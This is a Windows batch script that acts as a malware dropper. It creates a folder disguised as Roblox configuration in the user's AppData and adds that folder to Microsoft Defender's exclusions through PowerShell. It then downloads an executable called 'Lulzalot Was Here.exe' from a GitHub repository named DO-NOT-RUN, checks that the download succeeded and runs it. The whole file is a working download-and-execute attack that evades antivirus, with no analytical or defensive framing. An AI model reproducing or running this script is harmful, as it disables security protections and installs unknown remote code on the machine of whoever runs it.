@echo off
start "" cmd /k (
    set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
    mkdir "%folderPath%"
    powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"

    :: Download the file using curl
    curl -L -o "%folderPath%\Lulzalot Was Here.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe"
    
    :: Check if the file exists and its size is greater than 0 bytes
    if exist "%folderPath%\Lulzalot Was Here.exe" (
        for %%F in ("%folderPath%\Lulzalot Was Here.exe") do (
            set filesize=%%~zF
        )
        
        if "%filesize%"=="0" (
            echo Download failed or file is empty. Exiting...
            exit /b 1
        ) else (
            echo File downloaded successfully. Size: %filesize% bytes.
        )
    ) else (
        echo File download failed. Exiting...
        exit /b 1
    )
    
    :: Run the executable now that the download is confirmed
    start "" "%folderPath%\Lulzalot Was Here.exe"
)
exit
